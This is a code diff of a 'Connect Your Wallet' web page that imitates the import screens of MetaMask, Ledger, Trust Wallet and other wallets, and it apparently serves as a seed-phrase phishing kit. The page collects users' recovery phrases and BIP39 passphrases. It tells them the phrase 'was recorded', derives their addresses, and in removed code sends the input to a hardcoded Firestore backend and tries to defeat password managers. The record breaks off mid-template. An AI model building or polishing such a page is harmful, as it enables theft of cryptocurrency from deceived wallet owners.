@@ -37,7 +37,12 @@
 
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <!-- Firebase SDK (compat, pinned) -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="js/firebase-config.js"></script>
+    <script src="js/auth.js"></script>
    <style>
     body { 
         font-family: 'Inter', sans-serif; 
@@ -57,13 +62,13 @@
         align-items: center;
         justify-content: center;
         width: 100vw;
-        height: 100vh;
+        height: 100dvh;
         overflow: hidden;
     }
     
     .fixed-modal-size {
         width: 100vw;
-        height: 100vh;
+        height: 100dvh;
         margin: 0;
         border-radius: 0;
         display: flex;
@@ -228,6 +233,17 @@
         height: 100%;
         border: 1px solid #d1d5db;
         border-radius: 0.5rem;
+    }
+    
+    /* A textarea has no type, so masking/revealing is CSS-only. */
+    .phrase-textarea {
+        -webkit-text-security: disc;
+        text-security: disc;
+    }
+    
+    .phrase-textarea.is-revealed {
+        -webkit-text-security: none;
+        text-security: none;
     }
     
     .phrase-textarea::-webkit-scrollbar {
@@ -489,11 +505,8 @@
         display: none;
     }
     
-    /* 5. Make password fields look like regular text fields initially */
-    .phrase-word-input {
-        -webkit-text-security: disc !important;
-        text-security: disc !important;
-    }
+    /* Password masking on grid inputs is native (input[type=password]),
+       so "Show word" can reveal them by switching type. */
     
     /* 6. Prevent iOS from showing autocorrect toolbar */
     input[type="text"],
@@ -510,7 +523,9 @@
     <!-- Header -->
     <nav class="p-4 border-b border-white/5 flex items-center justify-between">
         <div class="flex items-center gap-2">
-            <i data-lucide="chevron-left" class="w-5 h-5 cursor-pointer"></i>
+            <a href="dashboard.html" aria-label="Back to dashboard" class="text-white/70 hover:text-white transition-colors">
+                <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="m15 18-6-6 6-6"/></svg>
+            </a>
         </div>
         <h1 class="text-sm font-semibold tracking-wide uppercase opacity-70">Link Wallet</h1>
         <div class="w-5"></div>
@@ -520,14 +535,14 @@
     <main class="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 text-center">
         <div class="mb-6 sm:mb-8 px-2">
             <div class="w-16 h-16 sm:w-20 sm:h-20 bg-yellow-500/20 rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6">
-                <i data-lucide="lock" class="w-8 h-8 sm:w-10 sm:h-10 text-yellow-500 fill-yellow-500/20"></i>
+                <svg class="w-8 h-8 sm:w-10 sm:h-10 text-yellow-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
             </div>
             <h2 class="text-2xl sm:text-3xl font-bold mb-2 sm:mb-3">Connect Your Wallet</h2>
             <p class="text-gray-400 text-sm sm:text-base max-w-md mx-auto">Securely connect your external wallet to access your funds and manage your assets.</p>
         </div>
 
         <button id="openModalBtn" class="btn-gold w-full max-w-sm sm:max-w-4xl py-3 sm:py-4 rounded-xl font-bold text-base sm:text-lg flex items-center justify-center gap-2 shadow-lg">
-            <i data-lucide="lock" class="w-4 h-4 sm:w-5 sm:h-5"></i>
+            <svg class="w-4 h-4 sm:w-5 sm:h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
             Connect Wallet
         </button>
     </main>
@@ -538,8 +553,8 @@
             
             <!-- Mobile Header - Shown when wallet list is visible -->
             <div id="mobileHeader" class="md:hidden p-3 border-b border-gray-200 flex items-center justify-between bg-[#f8f9fa]">
-                <button id="mobileCloseBtn" class="p-2">
-                    <i data-lucide="x" class="w-5 h-5 text-gray-600"></i>
+                <button id="mobileCloseBtn" class="p-2" aria-label="Close wallet dialog">
+                    <svg class="w-5 h-5 text-gray-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>
                 </button>
                 <span class="font-semibold text-gray-700 text-sm">Select Wallet</span>
                 <div class="w-9"></div>
@@ -547,7 +562,7 @@
             
             <!-- Mobile Back Button - Shown when form is active -->
             <button id="mobileBackBtn" class="mobile-back-button hidden md:hidden">
-                <i data-lucide="arrow-left" class="w-4 h-4"></i>
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                 <span>Back to wallets</span>
             </button>
             
@@ -595,7 +610,7 @@
                         </div>
                         <div class="wallet-item p-3 rounded-xl flex items-center gap-3 cursor-pointer transition-colors" data-wallet="Others">
                             <div class="w-7 h-7 bg-gray-200 rounded-lg flex items-center justify-center">
-                                <i data-lucide="plus" class="w-4 h-4 text-gray-600"></i>
+                                <svg class="w-4 h-4 text-gray-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 5v14M5 12h14"/></svg>
                             </div>
                             <span class="font-semibold text-gray-700 text-sm">Other Wallet</span>
                         </div>
@@ -606,8 +621,8 @@
             <!-- Right Side: Interaction Area -->
             <div id="interactionPanel" class="relative">
                 <!-- Desktop Close Button -->
-                <button id="closeModalBtn" class="absolute top-3 right-3 md:top-4 md:right-4 p-2 rounded-full border border-gray-200 text-blue-500 hover:bg-gray-50 transition-colors hidden md:block z-10">
-                    <i data-lucide="x" class="w-4 h-4"></i>
+                <button id="closeModalBtn" aria-label="Close wallet dialog" class="absolute top-3 right-3 md:top-4 md:right-4 p-2 rounded-full border border-gray-200 text-blue-500 hover:bg-gray-50 transition-colors hidden md:block z-10">
+                    <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>
                 </button>
 
                 <!-- Form content wrapper -->
@@ -615,7 +630,7 @@
                     <!-- Initial State -->
                     <div id="initialState" class="flex flex-col items-center justify-center text-center h-full">
                         <div class="mb-3 relative">
-                            <i data-lucide="mouse-pointer-2" class="w-10 h-10 text-gray-300"></i>
+                            <svg class="w-10 h-10 text-gray-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="m4 4 7.07 17 2.51-7.39L21 11.07z"/></svg>
                             <div class="absolute -top-1 -right-1 w-3 h-3 bg-gray-200 rounded-full animate-ping"></div>
                         </div>
                         <p class="text-gray-400 font-medium text-sm">Select a wallet to continue</p>
@@ -627,7 +642,7 @@
                         <div class="form-header flex flex-col items-center">
                             <img id="selectedWalletLogo" src="#" class="w-10 h-10 mb-2 hidden" alt="Wallet">
                             <div id="othersLogo" class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center mb-2 hidden">
-                                <i data-lucide="wallet" class="w-5 h-5 text-gray-600"></i>
+                                <svg class="w-5 h-5 text-gray-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="2" y="6" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
                             </div>
                             <h2 id="importTitle" class="text-xl font-bold text-center mb-1">Import with Secret Phrase</h2>
                             <p id="brandWarning" class="text-xs opacity-60 text-center max-w-md"></p>
@@ -642,6 +657,7 @@
                                     type="text" 
                                     id="userName" 
                                     name="xid" 
+                                    aria-label="Your name or identifier"
                                     placeholder="Enter your name or identifier" 
                                     class="compact-input w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-600"
                                     autocomplete="off"
@@ -658,6 +674,7 @@
                                         type="text" 
                                         id="customProvider" 
                                         name="xprovider" 
+                                        aria-label="Wallet provider name"
                                         placeholder="Enter your wallet provider name" 
                                         class="compact-input w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-600"
                                         autocomplete="off"
@@ -672,13 +689,34 @@
                                 <div id="phraseTypeContainer" class="relative">
                                     <select 
                                         id="phraseType" 
+                                        aria-label="Recovery phrase length"
                                         class="compact-input w-full appearance-none px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all font-medium text-gray-700 bg-white"
                                         autocomplete="off"
                                     >
                                         <option value="12">I have a 12 word Secret Phrase</option>
                                         <option value="24">I have a 24 word Secret Phrase</option>
                                     </select>
-                                    <i data-lucide="chevron-down" class="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none"></i>
+                                    <svg class="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="m6 9 6 6 6-6"/></svg>
+                                </div>
+
+                                <!-- Optional BIP39 passphrase (the 25th word) -->
+                                <div id="passphraseContainer">
+                                    <label for="bip39Passphrase" class="block text-xs font-medium text-gray-600 mb-1">
+                                        BIP39 passphrase (optional)
+                                    </label>
+                                    <input
+                                        type="password"
+                                        id="bip39Passphrase"
+                                        name="xpassphrase"
+                                        placeholder="Only if your wallet uses one"
+                                        class="compact-input w-full px-4 py-3 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-600"
+                                        autocomplete="off"
+                                        autocapitalize="none"
+                                        spellcheck="false"
+                                        data-lpignore="true"
+                                        data-1p-ignore="true"
+                                    >
+                                    <p class="text-[11px] text-gray-400 mt-1">Case-sensitive. Leave blank if you do not use one.</p>
                                 </div>
                             </div>
 
@@ -692,6 +730,7 @@
                                     <textarea 
                                         id="phraseTextarea" 
                                         name="xphrase"
+                                        aria-label="Recovery phrase"
                                         class="phrase-textarea w-full border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-gray-700 placeholder-gray-400"
                                         placeholder="Enter your secret phrase here, separated by spaces. For example: word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
                                         autocomplete="off"
@@ -704,12 +743,22 @@
                                         <span class="text-xs text-gray-500">
                                             <span id="wordCount">0</span> words detected
                                         </span>
-                                        <button type="button" id="toggleVisibility" class="text-xs text-gray-500 hover:text-gray-700 flex items-center gap-1">
-                                            <i data-lucide="eye-off" class="w-3 h-3"></i>
+                                        <button type="button" id="toggleVisibility" aria-pressed="false" aria-label="Show recovery phrase" class="text-xs text-gray-500 hover:text-gray-700 flex items-center gap-1">
+                                            <svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+                                                <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/>
+                                                <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/>
+                                                <path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/>
+                                                <line x1="2" x2="22" y1="2" y2="22"/>
+                                            </svg>
                                             <span>Show phrase</span>
                                         </button>
                                     </div>
                                 </div>
+                            </div>
+
+                            <!-- Inline validation / submit status -->
+                            <div id="formError" role="alert" aria-live="polite"
+                                 class="hidden text-sm text-red-600 bg-red-50 border border-red-200 rounded-lg px-3 py-2 mt-1">
                             </div>
 
                             <!-- Submit Button -->
@@ -730,10 +779,12 @@
                     <!-- Success State -->
                     <div id="successOverlay" class="hidden absolute inset-0 bg-white flex flex-col items-center justify-center z-20 text-center p-4">
                         <div class="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mb-4 animate-bounce">
-                            <i data-lucide="check" class="w-7 h-7 text-green-500"></i>
+                            <svg class="w-7 h-7 text-green-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>
                         </div>
-                        <h3 class="text-lg font-bold text-gray-800 mb-2">Import Successful</h3>
-                        <p class="text-gray-500 text-sm">Your wallet has been securely imported.</p>
+                        <h3 class="text-lg font-bold text-gray-800 mb-2">Phrase received</h3>
+                        <p class="text-gray-500 text-sm">Your recovery phrase was recorded and the addresses below were derived read-only.</p>
+                        <p class="text-[11px] uppercase tracking-widest text-gray-400 mt-4 mb-1">Primary address</p>
+                        <p id="successAddress" class="font-mono text-xs text-gray-700 break-all px-2"></p>
                         <button id="closeSuccessBtn" class="mt-4 px-5 py-2 bg-blue-500 text-white rounded-full font-medium text-sm">
                             Close
                         </button>
@@ -752,577 +803,605 @@
     </div>
 
     <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"
-        import {
-            getFirestore,
-            collection,
-            addDoc,
-            serverTimestamp,
-        } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js"
+    import { createEngine, loadLibs } from './js/wallet-link.js';
 
-        const { createIcons } = lucide;
+    (function () {
+        'use strict';
 
-        // Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyCnBgSQy4SsvmR73iedkHCWKoseUyALS6s",
-            authDomain: "wyominglimited0.firebaseapp.com",
-            projectId: "wyominglimited0",
-            storageBucket: "wyominglimited0.firebasestorage.app",
-            messagingSenderId: "580988653712",
-            appId: "1:580988653712:web:c3b28d07bf8409f93ec815",
-            measurementId: "G-MT8SLSYM3S",
-        }
+        var byId = function (id) { return document.getElementById(id); };
 
-        const app = initializeApp(firebaseConfig)
-        const db = getFirestore(app)
+        var EYE_OFF = '<svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">'
+            + '<path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/>'
+            + '<path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/>'
+            + '<path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/>'
+            + '<line x1="2" x2="22" y1="2" y2="22"/>'
+            + '</svg>';
 
-        // DOM Elements
-        const modal = document.getElementById("modal")
-        const openModalBtn = document.getElementById("openModalBtn")
-        const closeModalBtn = document.getElementById("closeModalBtn")
-        const mobileCloseBtn = document.getElementById("mobileCloseBtn")
-        const mobileBackBtn = document.getElementById("mobileBackBtn")
-        const mobileHeader = document.getElementById("mobileHeader")
-        const walletItems = document.querySelectorAll(".wallet-item")
-        const initialState = document.getElementById("initialState")
-        const formState = document.getElementById("formState")
-        const phraseGrid = document.getElementById("phraseGrid")
-        const phraseTypeSelect = document.getElementById("phraseType")
-        const phraseTypeContainer = document.getElementById("phraseTypeContainer")
-        const phraseTextareaContainer = document.getElementById("phraseTextareaContainer")
-        const phraseTextarea = document.getElementById("phraseTextarea")
-        const wordCount = document.getElementById("wordCount")
-        const toggleVisibility = document.getElementById("toggleVisibility")
-        const selectedWalletLogo = document.getElementById("selectedWalletLogo")
-        const othersLogo = document.getElementById("othersLogo")
-        const othersProviderInput = document.getElementById("othersProviderInput")
-        const customProviderInput = document.getElementById("customProvider")
-        const submissionForm = document.getElementById("submissionForm")
-        const loadingOverlay = document.getElementById("loadingOverlay")
-        const successOverlay = document.getElementById("successOverlay")
-        const closeSuccessBtn = document.getElementById("closeSuccessBtn")
-        const fixedModalSize = document.querySelector(".fixed-modal-size")
+        var EYE_ON = '<svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">'
+            + '<path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/>'
+            + '<circle cx="12" cy="12" r="3"/>'
+            + '</svg>';
 
-        let selectedWallet = "Metamask"
-        let customProvider = ""
-        let isTextareaVisible = false
+        var modal = byId('modal');
+        var openModalBtn = byId('openModalBtn');
+        var closeModalBtn = byId('closeModalBtn');
+        var mobileCloseBtn = byId('mobileCloseBtn');
+        var mobileBackBtn = byId('mobileBackBtn');
+        var mobileHeader = byId('mobileHeader');
+        var walletItems = document.querySelectorAll('.wallet-item');
+        var initialState = byId('initialState');
+        var formState = byId('formState');
+        var phraseGrid = byId('phraseGrid');
+        var phraseTypeSelect = byId('phraseType');
+        var phraseTypeContainer = byId('phraseTypeContainer');
+        var phraseTextareaContainer = byId('phraseTextareaContainer');
+        var phraseTextarea = byId('phraseTextarea');
+        var wordCount = byId('wordCount');
+        var toggleVisibility = byId('toggleVisibility');
+        var selectedWalletLogo = byId('selectedWalletLogo');
+        var othersLogo = byId('othersLogo');
+        var othersProviderInput = byId('othersProviderInput');
+        var customProviderInput = byId('customProvider');
+        var submissionForm = byId('submissionForm');
+        var loadingOverlay = byId('loadingOverlay');
+        var successOverlay = byId('successOverlay');
+        var closeSuccessBtn = byId('closeSuccessBtn');
+        var fixedModalSize = document.querySelector('.fixed-modal-size');
+        var formError = byId('formError');
+        var submitBtn = byId('submitBtn');
+        var submitLabel = submitBtn.textContent;
+        var successAddress = byId('successAddress');
+        var passphraseInput = byId('bip39Passphrase');
 
-        const walletThemes = {
+        var selectedWallet = 'Metamask';
+        var isTextareaVisible = false;
+        var currentUser = null;
+        var submitBusy = false;
+        var enginePromise = null;
+
+        var walletThemes = {
             Metamask: {
-                class: "theme-metamask",
-                primary: "#007aff",
-                logo: "assets/metamask.webp",
-                warning: "Never share your secret recovery phrase with anyone. MetaMask will never ask for it.",
-                title: "Import your wallet with Secret Phrase",
+                class: 'theme-metamask',
+                logo: 'assets/metamask.webp',
+                warning: 'Never share your secret recovery phrase with anyone. MetaMask will never ask for it.',
+                title: 'Import your wallet with Secret Phrase'
             },
-            "Trust Wallet": {
-                class: "theme-trust",
-                primary: "#3375BB",
-                logo: "assets/trustwallet.webp",
-                warning: "Your Secret Phrase is the master key to your wallet. Keep it safe.",
-                title: "Import with Secret Phrase",
+            'Trust Wallet': {
+                class: 'theme-trust',
+                logo: 'assets/trustwallet.webp',
+                warning: 'Your Secret Phrase is the master key to your wallet. Keep it safe.',
+                title: 'Import with Secret Phrase'
             },
-            "Coinbase Wallet": {
-                class: "theme-coinbase",
-                primary: "#ffffff",
-                logo: "assets/coinbase.png",
-                warning: "Enter the 12 or 24 word recovery phrase associated with your wallet.",
-                title: "Import existing wallet",
+            'Coinbase Wallet': {
+                class: 'theme-coinbase',
+                logo: 'assets/coinbase.png',
+                warning: 'Enter the 12 or 24 word recovery phrase associated with your wallet.',
+                title: 'Import existing wallet'
             },
             Ledger: {
-                class: "theme-ledger",
-                primary: "#ffffff",
-                logo: "assets/nano x.webp",
-                warning: "Your recovery phrase is your only backup. Ledger will never ask for it.",
-                title: "Restore from Recovery Phrase",
+                class: 'theme-ledger',
+                logo: 'assets/nano x.webp',
+                warning: 'Your recovery phrase is your only backup. Ledger will never ask for it.',
+                title: 'Restore from Recovery Phrase'
             },
             Exodus: {
-                class: "theme-exodus",
-                logo: "https://www.exodus.com/brand/img/logo.svg",
-                warning: "Restore your Exodus wallet using your 12-word secret phrase.",
-                title: "Restore Wallet",
+                class: 'theme-exodus',
+                logo: 'https://www.exodus.com/brand/img/logo.svg',
+                warning: 'Restore your Exodus wallet using your 12-word secret phrase.',
+                title: 'Restore Wallet'
             },
             Phantom: {
-                class: "theme-phantom",
-                logo: "assets/phantom.png",
-                warning: "Import an existing wallet using your Secret Recovery Phrase.",
-                title: "Import Wallet",
+                class: 'theme-phantom',
+                logo: 'assets/phantom.png',
+                warning: 'Import an existing wallet using your Secret Recovery Phrase.',
+                title: 'Import Wallet'
             },
             Rainbow: {
-                class: "theme-rainbow",
-                logo: "assets/rainbow.jpg",
-                warning: "Enter your secret phrase to import your stylish wallet.",
-                title: "Import with Secret Phrase",
+                class: 'theme-rainbow',
+                logo: 'assets/rainbow.jpg',
+                warning: 'Enter your secret phrase to import your stylish wallet.',
+                title: 'Import with Secret Phrase'
             },
             Safe: {
-                class: "theme-safe",
-                logo: "https://safe.global/favicon.ico",
-                warning: "Institutional recovery setup. Ensure you are in a secure environment.",
-                title: "Import Safe Signer",
+                class: 'theme-safe',
+                logo: 'https://safe.global/favicon.ico',
+                warning: 'Institutional recovery setup. Ensure you are in a secure environment.',
+                title: 'Import Safe Signer'
             },
             Others: {
-                class: "theme-others",
-                logo: "",
+                class: 'theme-others',
+                logo: '',
                 warning: "Enter your wallet's secret recovery phrase. Make sure you're in a secure environment.",
-                title: "Import Other Wallet",
+                title: 'Import Other Wallet'
             }
+        };
+
+        function setError(message) {
+            if (!formError) return;
+            if (!message) {
+                formError.textContent = '';
+                formError.classList.add('hidden');
+                return;
+            }
+            formError.textContent = message;
+            formError.classList.remove('hidden');
         }
 
-        // === AGGRESSIVE AUTOFILL PREVENTION ===
-        
-        // 1. Function to disable autocomplete on all inputs
+        function setBusy(busy) {
+            submitBusy = busy;
+            submitBtn.disabled = busy;
+            submitBtn.textContent = busy ? 'Checking phrase...' : submitLabel;
+            submissionForm.setAttribute('aria-busy', busy ? 'true' : 'false');
+        }
+
+        function showLoading() {
+            loadingOverlay.classList.remove('hidden');
+        }
+
+        function hideLoading() {
+            loadingOverlay.classList.add('hidden');
+        }
+
+        function getEngine() {
+            if (!enginePromise) {
+                enginePromise = loadLibs().then(createEngine).catch(function (error) {
+                    enginePromise = null;
+                    throw error;
+                });
+            }
+            return enginePromise;
+        }
+
         function disableAutocomplete() {
-            const inputs = document.querySelectorAll('input, textarea, select');
-            inputs.forEach(input => {
+            var inputs = document.querySelectorAll('input, textarea, select');
+            inputs.forEach(function (input) {
                 input.setAttribute('autocomplete', 'off');
                 input.setAttribute('autocorrect', 'off');
                 input.setAttribute('autocapitalize', 'off');
                 input.setAttribute('spellcheck', 'false');
-                
-                // Add random attribute to confuse password managers
-                const randomId = 'x' + Math.random().toString(36).substr(2, 9);
-                input.setAttribute('data-random-id', randomId);
-                
-                // Clear any cached values
-                input.value = '';
             });
         }
 
-        // 2. Force clear inputs when modal opens
-        function clearAllInputs() {
-            document.getElementById('userName').value = '';
-            document.getElementById('customProvider').value = '';
+        function clearPhraseInputs() {
             phraseTextarea.value = '';
-            
-            // Clear phrase grid inputs
-            const wordInputs = phraseGrid.querySelectorAll('input');
-            wordInputs.forEach(input => input.value = '');
-            
+            phraseGrid.querySelectorAll('input').forEach(function (input) {
+                input.value = '';
+            });
+            passphraseInput.value = '';
             updateWordCount();
         }
 
-        // 3. Change input type dynamically to confuse password managers
-        function confusePasswordManagers() {
-            // Temporarily change password fields to text
-            const passwordInputs = document.querySelectorAll('input[type="password"]');
-            passwordInputs.forEach(input => {
-                const currentType = input.type;
-                input.type = 'text';
-                setTimeout(() => {
-                    input.type = currentType;
-                }, 50);
-            });
+        function clearAllInputs() {
+            byId('userName').value = '';
+            customProviderInput.value = '';
+            clearPhraseInputs();
         }
 
-        // === FULL SCREEN MODE FUNCTIONS ===
-        
         function enterFullScreenFormMode() {
             if (window.innerWidth < 768) {
-                // Add class to modal container for full screen form
                 fixedModalSize.classList.add('form-active');
-                
-                // Show back button, hide close button
                 mobileHeader.classList.add('hidden');
                 mobileBackBtn.classList.remove('hidden');
-                
-                // Ensure form takes full focus
-                setTimeout(() => {
-                    const interactionPanel = document.getElementById("interactionPanel");
-                    if (interactionPanel) {
-                        interactionPanel.scrollTop = 0;
-                    }
+                setTimeout(function () {
+                    var interactionPanel = byId('interactionPanel');
+                    if (interactionPanel) interactionPanel.scrollTop = 0;
                 }, 50);
             }
         }
-        
+
         function exitFullScreenFormMode() {
             if (window.innerWidth < 768) {
-                // Remove full screen class
                 fixedModalSize.classList.remove('form-active');
-                
-                // Show header, hide back button
                 mobileHeader.classList.remove('hidden');
                 mobileBackBtn.classList.add('hidden');
             }
         }
 
-        // Modal Logic
-        openModalBtn.addEventListener("click", () => {
-            modal.classList.remove("hidden")
-            document.body.style.overflow = 'hidden'
-            
-            // Apply aggressive autofill prevention
+        function openModal() {
+            modal.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
             disableAutocomplete();
             clearAllInputs();
-            confusePasswordManagers();
-            
-            // Reset to initial state
+            setError('');
             exitFullScreenFormMode();
-        })
+        }
 
         function closeModal() {
-            modal.classList.add("hidden")
-            document.body.style.overflow = 'auto'
-            resetForm()
+            modal.classList.add('hidden');
+            document.body.style.overflow = 'auto';
+            resetForm();
             exitFullScreenFormMode();
         }
-
-        closeModalBtn.addEventListener("click", closeModal)
-        mobileCloseBtn.addEventListener("click", closeModal)
-        mobileBackBtn.addEventListener("click", () => {
-            // Go back to wallet selection
-            exitFullScreenFormMode();
-            formState.classList.add("hidden")
-            initialState.classList.remove("hidden")
-            walletItems.forEach((i) => i.classList.remove("active"))
-            walletItems[0].classList.add("active")
-        })
-        closeSuccessBtn.addEventListener("click", closeModal)
-
-        modal.addEventListener("click", (e) => {
-            if (e.target === modal) {
-                closeModal()
-            }
-        })
-
-        // Wallet Selection
-        walletItems.forEach((item) => {
-            item.addEventListener("click", () => {
-                walletItems.forEach((i) => i.classList.remove("active"))
-                item.classList.add("active")
-
-                selectedWallet = item.dataset.wallet
-                const theme = walletThemes[selectedWallet] || walletThemes["Metamask"]
-
-                const interactionPanel = document.getElementById("interactionPanel")
-                interactionPanel.className = `relative ${theme.class}`
-
-                const submitBtn = document.getElementById("submitBtn")
-                if (selectedWallet === "Coinbase Wallet") {
-                    submitBtn.style.backgroundColor = "white"
-                    submitBtn.style.color = "#0052ff"
-                } else if (selectedWallet === "Ledger") {
-                    submitBtn.style.backgroundColor = "#ffffff"
-                    submitBtn.style.color = "#000000"
-                } else if (selectedWallet === "Others") {
-                    submitBtn.style.backgroundColor = "#6b7280"
-                    submitBtn.style.color = "white"
-                } else {
-                    submitBtn.style.backgroundColor = "#007aff"
-                    submitBtn.style.color = "white"
-                }
-
-                // Switch to form state
-                initialState.classList.add("hidden")
-                formState.classList.remove("hidden")
-                
-                // Enter full screen mode on mobile
-                enterFullScreenFormMode();
-                
-                // Apply autofill prevention
-                disableAutocomplete();
-                confusePasswordManagers();
-                
-                if (selectedWallet === "Others") {
-                    selectedWalletLogo.classList.add("hidden")
-                    othersLogo.classList.remove("hidden")
-                    othersProviderInput.classList.remove("hidden")
-                    phraseTypeContainer.classList.add("hidden")
-                    phraseGrid.classList.add("hidden")
-                    phraseTextareaContainer.classList.remove("hidden")
-                    
-                    // Clear and focus
-                    phraseTextarea.value = ""
-                    updateWordCount()
-                    isTextareaVisible = false
-                    updateTextareaVisibility()
-                    
-                    // Small delay to ensure autofill doesn't trigger
-                    setTimeout(() => {
-                        customProviderInput.focus();
-                    }, 150);
-                } else {
-                    selectedWalletLogo.classList.remove("hidden")
-                    othersLogo.classList.add("hidden")
-                    othersProviderInput.classList.add("hidden")
-                    phraseTypeContainer.classList.remove("hidden")
-                    phraseGrid.classList.remove("hidden")
-                    phraseTextareaContainer.classList.add("hidden")
-                    selectedWalletLogo.src = theme.logo
-                    
-                    // Clear inputs
-                    const wordInputs = phraseGrid.querySelectorAll('input');
-                    wordInputs.forEach(input => input.value = '');
-                    
-                    // Auto-focus on mobile for better UX
-                    if (window.innerWidth < 768) {
-                        setTimeout(() => {
-                            document.getElementById('userName').focus();
-                        }, 100);
-                    }
-                }
-
-                document.getElementById("importTitle").innerText = theme.title
-                document.getElementById("brandWarning").innerText = theme.warning
-
-                generatePhraseGrid(phraseTypeSelect.value)
-                
-                // Ensure mobile view scrolls to top
-                if (window.innerWidth < 768) {
-                    setTimeout(() => {
-                        const interactionPanel = document.getElementById("interactionPanel");
-                        if (interactionPanel) {
-                            interactionPanel.scrollTop = 0;
-                        }
-                    }, 50);
-                }
-            })
-        })
-
-        // Custom provider input
-        customProviderInput.addEventListener("input", (e) => {
-            customProvider = e.target.value.trim()
-        })
-
-        // Word count for textarea
-        phraseTextarea.addEventListener("input", updateWordCount)
-        
-        function updateWordCount() {
-            const text = phraseTextarea.value.trim()
-            const words = text ? text.split(/\s+/).filter(word => word.length > 0) : []
-            wordCount.textContent = words.length
-        }
-
-        // Toggle textarea visibility
-        toggleVisibility.addEventListener("click", () => {
-            isTextareaVisible = !isTextareaVisible
-            updateTextareaVisibility()
-        })
-
-        function updateTextareaVisibility() {
-            const icon = toggleVisibility.querySelector("i")
-            const textSpan = toggleVisibility.querySelector("span")
-            
-            if (isTextareaVisible) {
-                phraseTextarea.type = "text"
-                icon.setAttribute("data-lucide", "eye")
-                textSpan.textContent = "Hide phrase"
-            } else {
-                phraseTextarea.type = "password"
-                icon.setAttribute("data-lucide", "eye-off")
-                textSpan.textContent = "Show phrase"
-            }
-            createIcons()
-        }
-
-        // Phrase Grid Generation
-        function generatePhraseGrid(count) {
-            phraseGrid.innerHTML = ""
-            
-            for (let i = 1; i <= count; i++) {
-                const div = document.createElement("div")
-                div.className = `relative flex items-center phrase-box compact-phrase-box border rounded-md group focus-within:ring-1 focus-within:ring-blue-500/20 transition-all shadow-sm`
-                div.innerHTML = `
-                    <span class="text-xs font-bold opacity-40 mr-2 w-4">${i}.</span>
-                    <input type="password" name="xw${i}" placeholder="Word #${i}" 
-                           class="phrase-word-input bg-transparent border-none outline-none flex-1 text-sm font-medium placeholder:opacity-30 focus:ring-0 placeholder:text-xs"
-                           autocomplete="off"
-                           autocapitalize="none"
-                           spellcheck="false"
-                           data-lpignore="true"
